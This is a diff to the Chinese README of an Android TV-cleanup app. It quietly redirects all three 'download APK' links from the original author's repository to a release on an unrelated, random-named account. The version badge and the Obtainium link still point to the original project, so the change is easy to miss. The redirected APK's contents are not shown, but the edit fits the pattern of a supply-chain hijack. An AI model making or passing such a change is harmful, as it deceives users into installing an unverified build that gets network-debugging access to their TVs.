@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/udhaykumarbala/cleanyourtv-app/releases/latest"><img src="https://img.shields.io/github/v/release/udhaykumarbala/cleanyourtv-app?style=flat&color=E8A84C&labelColor=15181e&label=download%20APK" alt="下載最新版 APK"></a>
+  <a href="https://github.com/367737374iugouihoiuhg/cleanyourtv-app/releases/tag/v0.4.8-zh"><img src="https://img.shields.io/github/v/release/udhaykumarbala/cleanyourtv-app?style=flat&color=E8A84C&labelColor=15181e&label=download%20APK" alt="下載最新版 APK"></a>
   <img src="https://img.shields.io/badge/TVs-173%20lists%20%C2%B7%2047%20brands-E8A84C?style=flat&labelColor=15181e" alt="來自 47 個品牌的 173 份電視清單">
   <img src="https://img.shields.io/badge/phone-Android%209%2B-E8A84C?style=flat&labelColor=15181e" alt="Android 9 或更新">
   <img src="https://img.shields.io/badge/languages-English%20%C2%B7%20%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%20%C2%B7%20%E7%B9%81%E9%AB%94%E4%B8%AD%E6%96%87-E8A84C?style=flat&labelColor=15181e" alt="支援英文、簡體中文與繁體中文">
@@ -19,7 +19,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/udhaykumarbala/cleanyourtv-app/releases/latest"><b>下載</b></a> ·
+  <a href="https://github.com/367737374iugouihoiuhg/cleanyourtv-app/releases/tag/v0.4.8-zh"><b>下載</b></a> ·
   <a href="https://apps.obtainium.imranr.dev/redirect?r=obtainium://add/https://github.com/udhaykumarbala/cleanyourtv-app"><b>用 Obtainium 取得</b></a> ·
   <a href="#工作原理"><b>工作原理</b></a> ·
   <a href="#安全設計"><b>安全嗎？</b></a> ·
@@ -40,7 +40,7 @@
 | 應用在 Wi-Fi 上找到你的電視，並教你用遙控器放行這台手機。 | 它讀取電視上的內容並給出方案：哪些會關閉、哪些會保留。此時尚未改動任何東西。 | 點「開始清理」。先建立一個還原點，接著冗餘內容被關閉、新的主畫面被啟用。 |
 
 **你需要** 一台與電視連在同個 Wi-Fi 下的 Android 手機（Android 9 或更新，並設定鎖定螢幕）。
-[下載 APK](https://github.com/udhaykumarbala/cleanyourtv-app/releases/latest)，開啟即可安裝。連線約需
+[下載 APK](https://github.com/367737374iugouihoiuhg/cleanyourtv-app/releases/tag/v0.4.8-zh)，開啟即可安裝。連線約需
 一分鐘（你用遙控器開啟網路偵錯，應用會教你怎麼做），整個清理過程約五分鐘。
 
 你隨時可以回來還原某個應用、在電視系統更新後檢查有無殘留、更換底部 dock 或外觀，或撤銷全部改動。
